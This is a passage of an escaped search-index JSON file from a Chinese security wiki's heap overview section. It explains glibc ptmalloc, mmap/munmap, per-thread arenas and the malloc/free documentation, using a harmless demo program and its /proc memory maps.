/proc/6067/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e00000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\nmunmap\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\n\u591a\u7ebf\u7a0b\u652f\u6301\n\n\n\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728glibc\u7684ptmalloc\u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002\n\n\n/* Per thread arena example. */\n\n\n##include \nstdio.h\n\n\n##include \nstdlib.h\n\n\n##include \npthread.h\n\n\n##include \nunistd.h\n\n\n##include \nsys/types.h\n\n\n\nvoid\n*\n \nthreadFunc\n(\nvoid\n*\n \narg\n)\n \n{\n\n        \nprintf\n(\nBefore malloc in thread 1\n\\n\n);\n\n        \ngetchar\n();\n\n        \nchar\n*\n \naddr\n \n=\n \n(\nchar\n*\n)\n \nmalloc\n(\n1000\n);\n\n        \nprintf\n(\nAfter malloc and before free in thread 1\n\\n\n);\n\n        \ngetchar\n();\n\n        \nfree\n(\naddr\n);\n\n        \nprintf\n(\nAfter free in thread 1\n\\n\n);\n\n        \ngetchar\n();\n\n\n}\n\n\n\nint\n \nmain\n()\n \n{\n\n        \npthread_t\n \nt1\n;\n\n        \nvoid\n*\n \ns\n;\n\n        \nint\n \nret\n;\n\n        \nchar\n*\n \naddr\n;\n\n\n        \nprintf\n(\nWelcome to per thread arena example::%d\n\\n\n,\ngetpid\n());\n\n        \nprintf\n(\nBefore malloc in main thread\n\\n\n);\n\n        \ngetchar\n();\n\n        \naddr\n \n=\n \n(\nchar\n*\n)\n \nmalloc\n(\n1000\n);\n\n        \nprintf\n(\nAfter malloc and before free in main thread\n\\n\n);\n\n        \ngetchar\n();\n\n        \nfree\n(\naddr\n);\n\n        \nprintf\n(\nAfter free in main thread\n\\n\n);\n\n        \ngetchar\n();\n\n        \nret\n \n=\n \npthread_create\n(\nt1\n,\n \nNULL\n,\n \nthreadFunc\n,\n \nNULL\n);\n\n        \nif\n(\nret\n)\n\n        \n{\n\n                \nprintf\n(\nThread creation error\n\\n\n);\n\n                \nreturn\n \n-\n1\n;\n\n        \n}\n\n        \nret\n \n=\n \npthread_join\n(\nt1\n,\n \ns\n);\n\n        \nif\n(\nret\n)\n\n        \n{\n\n                \nprintf\n(\nThread join error\n\\n\n);\n\n                \nreturn\n \n-\n1\n;\n\n        \n}\n\n        \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d\n\uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\nb7e05000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u7b2c\u4e00\u6b21\u7533\u8bf7\u540e\n\uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660emalloc\u7684\u80cc\u540e\u662f\u7528brk\u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e861000\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e860x0806c000-0x0804b000=0x21000\u4e2a\u5b57\u8282\u7684\u5806\u3002\n\u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002\n\u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0brk\u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7e05000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e\n\uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531glibc\u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7e05000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u4e4b\u524d\n\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u6808\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread \n1\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7604000-b7605000 ---p \n00000000\n \n00\n:00 \n0\n \nb7605000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nstack:6594\n]\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u540e\n\uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b1\u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3ammap\u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709132KB\u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3athread arena\u3002\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e128KB\u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55arena\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884cmmap\u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002\n\n\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread \n1\n\nAfter malloc and before free in thread \n1\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7500000-b7521000 rw-p \n00000000\n \n00\n:00 \n0\n \nb7521000-b7600000 ---p \n00000000\n \n00\n:00 \n0\n \nb7604000-b7605000 ---p \n00000000\n \n00\n:00 \n0\n \nb7605000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nstack:6594\n]\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e\n\uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread \n1\n\nAfter malloc and before free in thread \n1\n\nAfter free in thread \n1\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539625\n     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7500000-b7521000 rw-p \n00000000\n \n00\n:00 \n0\n \nb7521000-b7600000 ---p \n00000000\n \n00\n:00 \n0\n \nb7604000-b7605000 ---p \n00000000\n \n00\n:00 \n0\n \nb7605000-b7e07000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nstack:6594\n]\n\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nsploitfun", 
            "title": "\u5806\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_1", 
            "text": "", 
            "title": "\u5806\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_2", 
            "text": "\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58\u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002  \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c   \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c\u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002  \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002   Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f15\u8d77\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86ptmalloc2\u3002  \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002", 
            "title": "\u4ec0\u4e48\u662f\u5806"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_3", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd   \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528  \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002", 
            "title": "\u5806\u7684\u57fa\u672c\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#malloc", 
            "text": "\u5728 glibc \u7684 malloc.h \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b  /*    malloc(size_t n)    Returns a pointer to a newly allocated chunk of at least n bytes, or null    if no space is available. Additionally, on failure, errno is    set to ENOMEM on ANSI C systems.    If n is zero, malloc returns a minumum-sized chunk. (The minimum    size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit    systems.)  On most systems, size_t is an unsigned type, so calls    with negative arguments are interpreted as requests for huge amounts    of space, which will often fail. The maximum supported value of n    differs across systems, but is in all cases less than the maximum    representable value of a size_t.  */   \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684\u6307\u9488\u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406   \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002  \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f\u65e0\u7b26\u53f7\u6570\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002", 
            "title": "malloc"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#free", 
            "text": "\u5728 glibc \u7684  malloc.h  \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b  /*        free(void* p)        Releases the chunk of memory pointed to by p, that had been previously        allocated using malloc or a related routine such as realloc.        It has no effect if p is null. It can have arbitrary (i.e., bad!)        effects if p has already been freed.        Unless disabled (using mallopt), freeing very large spaces will        when possible, automatically trigger operations that give        back unused memory to the system, thus reducing program footprint.      */   \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002  \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406   \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002  \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f  double free \u3002  \u9664\u4e86\u88ab\u7981\u7528 (mallopt) 